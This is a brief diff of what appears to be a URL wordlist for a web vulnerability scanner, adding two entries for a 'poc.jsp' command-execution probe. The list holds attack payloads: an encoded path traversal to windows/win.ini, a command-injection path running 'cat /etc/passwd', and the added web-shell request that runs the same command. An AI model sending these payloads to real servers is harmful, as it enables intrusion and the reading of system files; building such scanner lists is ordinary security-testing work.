@@ -1,3 +1,5 @@
 /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
 /css/eonweb.css
 /cgi-bin/;cat$IFS/etc/passwd
+/poc.jsp/
+/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
